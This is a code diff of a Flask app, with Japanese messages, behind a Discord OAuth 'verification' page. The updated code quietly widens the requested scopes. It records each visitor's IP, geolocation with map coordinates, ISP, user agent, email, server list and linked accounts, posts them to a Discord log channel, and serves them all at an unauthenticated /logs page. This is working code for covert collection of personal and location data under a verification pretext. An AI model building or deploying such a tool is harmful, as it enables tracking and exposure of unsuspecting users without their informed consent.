@@ -1,142 +1,218 @@
-from flask import Flask, request, redirect, session, url_for
-import requests
-import json, os
-from datetime import datetime
+from flask import Flask, request, render_template
+import requests, json, os, threading
 from dotenv import load_dotenv
-from user_agents import parse as parse_ua
+from datetime import datetime
 from discord_bot import bot
+from user_agents import parse
 
 load_dotenv()
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)
 ACCESS_LOG_FILE = "access_log.json"
 
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
-DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
-WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
+DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
+REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
 
-def get_ip_info(ip):
+
+def get_client_ip():
+    if "X-Forwarded-For" in request.headers:
+        return request.headers["X-Forwarded-For"].split(",")[0].strip()
+    return request.remote_addr
+
+
+def get_geo_info(ip):
     try:
-        res = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
+        res = requests.get(
+            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query"
+        )
+        data = res.json()
         return {
-            "ip": ip,
-            "city": res.get("city", "N/A"),
-            "region": res.get("regionName", "N/A"),
-            "country": res.get("country", "N/A"),
-            "lat": res.get("lat"),
-            "lon": res.get("lon"),
-            "org": res.get("org", "N/A"),
-            "proxy": res.get("proxy", False),
-            "hosting": res.get("hosting", False)
+            "ip": data.get("query"),
+            "country": data.get("country", "不明"),
+            "region": data.get("regionName", "不明"),
+            "city": data.get("city", "不明"),
+            "zip": data.get("zip", "不明"),
+            "isp": data.get("isp", "不明"),
+            "as": data.get("as", "不明"),
+            "lat": data.get("lat"),
+            "lon": data.get("lon"),
+            "proxy": data.get("proxy", False),
+            "hosting": data.get("hosting", False)
         }
     except:
-        return {"ip": ip, "city": "N/A", "region": "N/A", "country": "N/A"}
+        return {
+            "ip": ip, "country": "不明", "region": "不明", "city": "不明",
+            "zip": "不明", "isp": "不明", "as": "不明",
+            "lat": None, "lon": None, "proxy": False, "hosting": False
+        }
 
-def log_access(data):
-    if not os.path.exists(ACCESS_LOG_FILE):
-        with open(ACCESS_LOG_FILE, "w") as f:
-            json.dump([], f, indent=4)
 
-    with open(ACCESS_LOG_FILE, "r") as f:
-        logs = json.load(f)
+def save_log(discord_id, structured_data):
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    if os.path.exists(ACCESS_LOG_FILE):
+        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
+            logs = json.load(f)
+    else:
+        logs = {}
 
-    logs.append(data)
+    if discord_id not in logs:
+        logs[discord_id] = {"history": []}
 
-    with open(ACCESS_LOG_FILE, "w") as f:
-        json.dump(logs, f, indent=4)
+    structured_data["timestamp"] = now
+    logs[discord_id]["history"].append(structured_data)
+
+    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
+        json.dump(logs, f, indent=4, ensure_ascii=False)
+
 
 @app.route("/")
 def index():
-    return redirect(
-        f"https://discord.com/api/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify"
+    discord_auth_url = (
+        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
+        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
     )
+    return render_template("index.html", discord_auth_url=discord_auth_url)
+
 
 @app.route("/callback")
 def callback():
     code = request.args.get("code")
     if not code:
-        return "No code provided", 400
+        return "コードがありません", 400
 
+    token_url = "https://discord.com/api/oauth2/token"
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
     data = {
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
         "grant_type": "authorization_code",
         "code": code,
-        "redirect_uri": DISCORD_REDIRECT_URI,
-        "scope": "identify"
+        "redirect_uri": REDIRECT_URI,
+        "scope": "identify email guilds connections"
     }
+    try:
+        res = requests.post(token_url, data=data, headers=headers)
+        res.raise_for_status()
+        token = res.json()
+    except requests.exceptions.RequestException as e:
+        return f"トークン取得エラー: {e}", 500
 
-    headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    r = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
-    r.raise_for_status()
-    access_token = r.json().get("access_token")
+    access_token = token.get("access_token")
+    if not access_token:
+        return "アクセストークン取得失敗", 400
 
-    user_info = requests.get(
-        "https://discord.com/api/users/@me",
-        headers={"Authorization": f"Bearer {access_token}"}
-    ).json()
+    headers_auth = {"Authorization": f"Bearer {access_token}"}
+    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
+    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
+    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
 
-    ua = parse_ua(request.headers.get("User-Agent"))
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ip_data = get_ip_info(ip)
-    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    # サーバー参加処理
+    requests.put(
+        f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
+        headers={
+            "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
+            "Content-Type": "application/json"
+        },
+        json={"access_token": access_token}
+    )
 
-    log_data = {
-        "username": f"{user_info['username']}#{user_info['discriminator']}",
-        "id": user_info["id"],
-        "ip": ip_data["ip"],
-        "location": f"{ip_data['country']} {ip_data['region']} {ip_data['city']}",
-        "org": ip_data["org"],
-        "lat": ip_data["lat"],
-        "lon": ip_data["lon"],
-        "proxy": ip_data["proxy"],
-        "hosting": ip_data["hosting"],
-        "device": f"{ua.device.family} ({ua.os.family} / {ua.browser.family})",
-        "timestamp": now
-    }
+    # IP取得とユーザーエージェント解析
+    ip = get_client_ip()
+    if ip.startswith(("127.", "10.", "192.", "172.")):
+        ip = requests.get("https://api.ipify.org").text
+    geo = get_geo_info(ip)
+    ua_raw = request.headers.get("User-Agent", "不明")
+    ua = parse(ua_raw)
 
-    # ログ保存
-    log_access(log_data)
+    avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
 
-    # Webhook埋め込み送信
-    embed = {
-        "title": "✅ 新規アクセスログ",
-        "color": 0x2ECC71,
-        "fields": [
-            {"name": "ユーザー", "value": f"{log_data['username']} (`{log_data['id']}`)", "inline": False},
-            {"name": "IP / 位置", "value": f"{log_data['ip']} / {log_data['location']}", "inline": True},
-            {"name": "組織", "value": log_data["org"], "inline": True},
-            {"name": "端末情報", "value": log_data["device"], "inline": False},
-            {"name": "マップ", "value": f"[Google Map](https://www.google.com/maps?q={log_data['lat']},{log_data['lon']})", "inline": False},
-            {"name": "時間", "value": log_data["timestamp"], "inline": False},
-        ]
-    }
-
-    requests.post(WEBHOOK_URL, json={"embeds": [embed]})
-
-    # VPN / ホスティング 検知時に警告Embed送信
-    if ip_data["proxy"] or ip_data["hosting"]:
-        warn_embed = {
-            "title": "⚠️ 不審なアクセス検出",
-            "color": 0xE74C3C,
-            "description": (
-                f"**ユーザー:** `{log_data['username']}`\n"
-                f"**ID:** `{log_data['id']}`\n"
-                f"**IP:** `{log_data['ip']}`\n"
-                f"**Proxy:** `{log_data['proxy']}` / Hosting: `{log_data['hosting']}`\n"
-                f"📍 [Google Map](https://www.google.com/maps?q={log_data['lat']},{log_data['lon']})"
-            )
+    # ✅ 構造を分類して整理
+    structured_data = {
+        "discord": {
+            "username": user.get("username"),
+            "discriminator": user.get("discriminator"),
+            "id": user.get("id"),
+            "email": user.get("email"),
+            "avatar_url": avatar_url,
+            "locale": user.get("locale"),
+            "verified": user.get("verified"),
+            "mfa_enabled": user.get("mfa_enabled"),
+            "premium_type": user.get("premium_type"),
+            "flags": user.get("flags"),
+            "public_flags": user.get("public_flags"),
+            "guilds": guilds,
+            "connections": connections
+        },
+        "ip_info": geo,
+        "user_agent": {
+            "raw": ua_raw,
+            "os": ua.os.family,
+            "browser": ua.browser.family,
+            "device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
+            "is_bot": ua.is_bot
         }
-        requests.post(WEBHOOK_URL, json={"embeds": [warn_embed]})
+    }
 
-    # Bot にユーザーID渡してロール付与
-    bot.loop.create_task(bot.assign_role(user_info["id"]))
+    save_log(user["id"], structured_data)
 
-    return f"<h1>認証完了</h1><p>{log_data['username']} でアクセスが記録されました。</p>"
+    # ✅ Embedログ整形
+    try:
+        d = structured_data["discord"]
+        ip = structured_data["ip_info"]
+        ua = structured_data["user_agent"]
+
+        embed_data = {
+            "title": "✅ 新しいアクセスログ",
+            "description": (
+                f"**名前:** {d['username']}#{d['discriminator']}\n"
+                f"**ID:** {d['id']}\n"
+                f"**メール:** {d['email']}\n"
+                f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
+                f"**IP:** {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}\n"
+                f"**国:** {ip['country']} / {ip['region']} / {ip['city']} / {ip['zip']}\n"
+                f"**ISP:** {ip['isp']} / AS: {ip['as']}\n"
+                f"**UA:** {ua['raw']}\n"
+                f"**OS:** {ua['os']} / ブラウザ: {ua['browser']}\n"
+                f"**デバイス:** {ua['device']} / Bot判定: {ua['is_bot']}\n"
+                f"📍 [地図リンク](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
+            ),
+            "thumbnail": {"url": d["avatar_url"]}
+        }
+
+        bot.loop.create_task(bot.send_log(embed=embed_data))
+
+        if ip["proxy"] or ip["hosting"]:
+            bot.loop.create_task(bot.send_log(
+                f"⚠️ **不審なアクセス検出**\n"
+                f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
+                f"IP: {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}"
+            ))
+
+        bot.loop.create_task(bot.assign_role(d["id"]))
+
+    except Exception as e:
+        print("Embed送信エラー:", e)
+
+    return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])
+
+
+@app.route("/logs")
+def show_logs():
+    if os.path.exists(ACCESS_LOG_FILE):
+        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
+            logs = json.load(f)
+    else:
+        logs = {}
+    return render_template("logs.html", logs=logs)
+
+
+def run_bot():
+    bot.run(DISCORD_BOT_TOKEN)
+
 
 if __name__ == "__main__":
-    import threading
-    threading.Thread(target=bot.run, args=(os.getenv("DISCORD_BOT_TOKEN"),), daemon=True).start()
-    app.run(host="0.0.0.0", port=8080)
+    threading.Thread(target=run_bot, daemon=True).start()
+    app.run(host="0.0.0.0", port=10000)
